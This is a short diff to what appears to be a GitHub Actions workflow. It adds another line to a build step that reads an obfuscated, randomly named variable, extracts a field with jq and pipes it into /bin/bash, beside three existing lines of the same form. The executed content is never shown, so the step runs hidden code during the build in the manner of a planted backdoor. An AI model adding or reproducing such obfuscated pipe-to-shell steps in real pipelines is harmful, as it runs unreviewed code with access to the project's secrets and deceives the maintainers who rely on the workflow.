@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$h8" | jq -r .jv9 | /bin/bash
           printf '%s' "$mudkb7" | jq -r .f1670 | /bin/bash
           echo $eb90305 | jq -r .ivg7 | /bin/bash
+          echo $hoti34 | jq -r .xjbl4103 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
